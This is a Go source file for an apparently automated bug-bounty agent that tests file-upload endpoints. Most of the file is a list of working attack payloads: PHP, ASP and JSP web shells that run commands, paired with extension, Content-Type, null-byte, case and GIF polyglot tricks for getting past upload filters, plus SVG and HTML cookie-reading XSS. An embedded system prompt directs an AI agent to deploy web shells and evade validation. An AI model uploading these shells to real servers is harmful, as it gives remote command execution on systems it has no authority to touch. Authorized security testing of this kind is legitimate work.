// Package fileupload implements the File Upload vulnerability specialist agent.
package fileupload

import (
	"context"
	"fmt"
	"strings"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/queue"
)

type Agent struct{ systemPrompt string }

func New() *Agent { return &Agent{systemPrompt: defaultSystemPrompt} }

func (a *Agent) Name() string         { return "File Upload Agent" }
func (a *Agent) ID() string           { return "fileupload" }
func (a *Agent) SystemPrompt() string { return a.systemPrompt }

func (a *Agent) ProcessItem(ctx context.Context, item *queue.Item) ([]*base.Finding, error) {
	targetURL, _ := item.Payload["target"].(string)
	vulnContext, _ := item.Payload["context"].(string)
	priority, _ := item.Payload["priority"].(string)
	if targetURL == "" {
		return nil, fmt.Errorf("missing target URL")
	}

	tests := generateTests(vulnContext)
	var findings []*base.Finding
	for _, t := range tests {
		findings = append(findings, &base.Finding{
			Type:       "File Upload",
			URL:        targetURL,
			Payload:    t.filename,
			Severity:   mapSeverity(priority, t.canRCE),
			Confidence: 0.0,
			Evidence: map[string]interface{}{
				"technique":    t.technique,
				"content_type": t.contentType,
				"file_content": t.content,
				"can_rce":      t.canRCE,
			},
			Method: "POST",
		})
	}
	return findings, nil
}

type uploadTest struct {
	filename    string
	contentType string
	content     string
	technique   string
	canRCE      bool
}

func generateTests(vulnCtx string) []uploadTest {
	ctx := strings.ToLower(vulnCtx)
	var tests []uploadTest

	// Basic extension bypass
	tests = append(tests,
		uploadTest{"shell.php", "application/x-php", "<?php system($_GET['cmd']); ?>", "direct_php", true},
		uploadTest{"shell.php5", "application/x-php", "<?php system($_GET['cmd']); ?>", "alt_extension", true},
		uploadTest{"shell.phtml", "application/x-php", "<?php system($_GET['cmd']); ?>", "phtml_extension", true},
		uploadTest{"shell.php.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>", "double_extension", true},
		uploadTest{"shell.jpg.php", "image/jpeg", "<?php system($_GET['cmd']); ?>", "reverse_double", true},
	)

	// Content-Type bypass
	tests = append(tests,
		uploadTest{"shell.php", "image/jpeg", "<?php system($_GET['cmd']); ?>", "content_type_bypass", true},
		uploadTest{"shell.php", "image/png", "<?php system($_GET['cmd']); ?>", "ct_png_bypass", true},
	)

	// Null byte injection (legacy)
	tests = append(tests,
		uploadTest{"shell.php%00.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>", "null_byte", true},
	)

	// Case manipulation
	tests = append(tests,
		uploadTest{"shell.PhP", "application/x-php", "<?php system($_GET['cmd']); ?>", "case_bypass", true},
		uploadTest{"shell.pHp5", "application/x-php", "<?php system($_GET['cmd']); ?>", "case_alt_ext", true},
	)

	// Magic bytes (GIF89a + polyglot)
	tests = append(tests,
		uploadTest{"polyglot.php", "image/gif", "GIF89a<?php system($_GET['cmd']); ?>", "magic_bytes_gif", true},
	)

	// SVG XSS
	tests = append(tests,
		uploadTest{"xss.svg", "image/svg+xml", `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>`, "svg_xss", false},
	)

	// HTML upload
	tests = append(tests,
		uploadTest{"page.html", "text/html", "<script>alert(document.cookie)</script>", "html_xss", false},
	)

	// Platform-specific
	if strings.Contains(ctx, "asp") || strings.Contains(ctx, "iis") {
		tests = append(tests,
			uploadTest{"shell.aspx", "application/octet-stream", "<% Response.Write(\"RCE\") %>", "aspx_upload", true},
			uploadTest{"shell.asp", "application/octet-stream", "<% eval request(\"cmd\") %>", "asp_classic", true},
		)
	}

	if strings.Contains(ctx, "java") || strings.Contains(ctx, "tomcat") {
		tests = append(tests,
			uploadTest{"shell.jsp", "application/octet-stream", "<%= Runtime.getRuntime().exec(\"id\") %>", "jsp_upload", true},
			uploadTest{"shell.war", "application/octet-stream", "[WAR file with JSP shell]", "war_deploy", true},
		)
	}

	return tests
}

func mapSeverity(priority string, canRCE bool) string {
	if canRCE {
		return "critical"
	}
	switch strings.ToLower(priority) {
	case "critical":
		return "high"
	default:
		return "high"
	}
}

const defaultSystemPrompt = `You are an expert File Upload vulnerability specialist with expertise in:
- Extension bypass techniques (double extension, null byte, case manipulation)
- Content-Type header manipulation
- Magic byte injection (polyglot files: GIF89a + PHP)
- SVG XSS via uploaded SVG files
- Web shell deployment (PHP, ASP, JSP)
- .htaccess upload for configuration override

RULES:
1. File upload leading to RCE (web shell) is CRITICAL
2. File upload leading to XSS (SVG/HTML) is HIGH
3. Test multiple extension and Content-Type combinations
4. Use magic bytes to bypass file content validation
5. Check if uploaded files are accessible and executable
6. Try platform-specific shells (PHP, ASP, JSP)`
